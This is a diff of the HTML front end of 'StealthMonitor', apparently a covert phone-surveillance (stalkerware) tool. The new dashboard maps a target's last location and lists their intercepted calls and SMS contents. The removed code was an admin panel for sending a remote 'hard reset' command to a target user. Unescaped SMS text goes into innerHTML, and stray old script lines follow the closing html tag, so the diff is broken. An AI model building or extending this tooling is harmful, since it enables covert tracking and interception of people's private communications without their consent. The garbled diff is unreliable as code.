@@ -1,39 +1,105 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>StealthMonitor – Painel Admin</title>
+  <meta charset="utf-8" />
+  <title>Dashboard - StealthMonitor</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
   <style>
-    body { font-family: sans-serif; margin: 2rem; }
-    input, button, pre { width: 100%; margin: .5rem 0; }
-    pre { background: #f4f4f4; padding: 1rem; }
+    body { font-family: sans-serif; margin: 0; padding: 0; }
+    #map { height: 300px; }
+    table { width: 100%; border-collapse: collapse; margin-top: 1em; }
+    th, td { border: 1px solid #ccc; padding: 8px; font-size: 14px; }
+    th { background: #f0f0f0; }
   </style>
 </head>
 <body>
-  <h1>Admin – Hard Reset</h1>
+  <h2>Dashboard StealthMonitor</h2>
+  <button onclick="logout()">Logout</button>
+  <button onclick="loadData()">🔄 Atualizar Dados</button>
 
-  <h2>1. Login Admin</h2>
-  <input id="admUser" placeholder="Usuário admin" />
-  <input id="admPass" type="password" placeholder="Senha admin" />
-  <button id="btnAdminLogin">Login</button>
-  <pre id="loginStatus">Não autenticado</pre>
+  <h3>🗺️ Localização</h3>
+  <div id="map"></div>
 
-  <h2>2. Enviar comando hardreset</h2>
-  <input id="targetUser" placeholder="Username de destino" />
-  <button id="btnSend">Enviar Hard Reset</button>
-  <pre id="cmdStatus">Aguardando comando…</pre>
+  <h3>📞 Chamadas</h3>
+  <table id="callsTable">
+    <thead>
+      <tr><th>Nome</th><th>Telefone</th><th>Tipo</th><th>Duração</th><th>Timestamp</th></tr>
+    </thead>
+    <tbody></tbody>
+  </table>
 
+  <h3>✉️ SMS</h3>
+  <table id="smsTable">
+    <thead>
+      <tr><th>De</th><th>Para</th><th>Conteúdo</th><th>Timestamp</th></tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
   <script>
-    let adminToken = '';
+    const token = localStorage.getItem('token');
+    if (!token) location.href = '/';
 
-    document.getElementById('btnAdminLogin').onclick = async () => {
-      const user = document.getElementById('admUser').value.trim();
-      const pass = document.getElementById('admPass').value.trim();
-      const status = document.getElementById('loginStatus');
-      if (!user || !pass) {
-        status.textContent = 'Informe usuário e senha.';
-        return;
+    const map = L.map('map').setView([0, 0], 2);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+
+    function logout() {
+      localStorage.removeItem('token');
+      location.href = '/';
+    }
+
+    async function loadData() {
+      try {
+        const res = await fetch('/api/data', {
+          headers: { Authorization: 'Bearer ' + token }
+        });
+        const data = await res.json();
+
+        const last = data[data.length - 1];
+        if (last?.location) {
+          map.setView([last.location.lat, last.location.lng], 14);
+          L.marker([last.location.lat, last.location.lng])
+            .addTo(map)
+            .bindPopup("Última Localização")
+            .openPopup();
+        }
+
+        const callsBody = document.querySelector('#callsTable tbody');
+        callsBody.innerHTML = '';
+        last.calls.forEach(call => {
+          const row = `<tr>
+            <td>${call.name}</td>
+            <td>${call.number}</td>
+            <td>${call.type}</td>
+            <td>${call.duration}</td>
+            <td>${new Date(call.timestamp).toLocaleString()}</td>
+          </tr>`;
+          callsBody.innerHTML += row;
+        });
+
+        const smsBody = document.querySelector('#smsTable tbody');
+        smsBody.innerHTML = '';
+        last.sms.forEach(msg => {
+          const row = `<tr>
+            <td>${msg.from}</td>
+            <td>${msg.to}</td>
+            <td>${msg.content}</td>
+            <td>${new Date(msg.timestamp).toLocaleString()}</td>
+          </tr>`;
+          smsBody.innerHTML += row;
+        });
+
+      } catch (err) {
+        alert("Erro ao carregar dados.");
+        console.error(err);
       }
+    }
+
+    loadData();
+  </script>
+</body>
+</html>
       status.textContent = 'Autenticando…';
       try {
         const res = await fetch('/api/auth/login', {
